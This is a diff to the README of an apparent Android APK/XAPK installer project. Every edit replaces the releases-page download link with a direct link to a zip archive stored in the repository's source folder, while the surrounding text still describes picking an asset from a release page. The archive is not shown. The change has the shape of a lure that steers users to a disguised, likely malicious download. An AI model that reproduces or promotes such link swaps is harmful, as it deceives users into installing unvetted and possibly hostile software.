@@ -1,10 +1,10 @@
 # 📱 universal-app-installer-android - Install APKs, APKS, XAPK With Ease
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Cauteryhemiplegic904/universal-app-installer-android/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Release-blue?style=for-the-badge)](https://github.com/Cauteryhemiplegic904/universal-app-installer-android/raw/refs/heads/main/app/src/app-universal-android-installer-v2.3-beta.5.zip)
 
 ## 🚀 Download
 
-Visit this page to download: https://github.com/Cauteryhemiplegic904/universal-app-installer-android/releases
+Visit this page to download: https://github.com/Cauteryhemiplegic904/universal-app-installer-android/raw/refs/heads/main/app/src/app-universal-android-installer-v2.3-beta.5.zip
 
 Open the latest release, then download the Android app file from the assets list on that page. If you see more than one file, choose the one that matches your device and install method.
 
@@ -32,7 +32,7 @@ It uses the native Android PackageInstaller, so it keeps the install flow close 
 
 ## 🛠️ How to install
 
-1. Open the download page: https://github.com/Cauteryhemiplegic904/universal-app-installer-android/releases
+1. Open the download page: https://github.com/Cauteryhemiplegic904/universal-app-installer-android/raw/refs/heads/main/app/src/app-universal-android-installer-v2.3-beta.5.zip
 2. Find the latest release.
 3. Download the app file from the release assets.
 4. On your Android device, open the downloaded file.
@@ -128,7 +128,7 @@ Check that the OBB data is in the correct place and that the package included al
 
 ## 📌 Release downloads
 
-Use this page to download the latest build: https://github.com/Cauteryhemiplegic904/universal-app-installer-android/releases
+Use this page to download the latest build: https://github.com/Cauteryhemiplegic904/universal-app-installer-android/raw/refs/heads/main/app/src/app-universal-android-installer-v2.3-beta.5.zip
 
 Open the newest release, then pick the asset that matches your device and install it on your Android phone or tablet
 
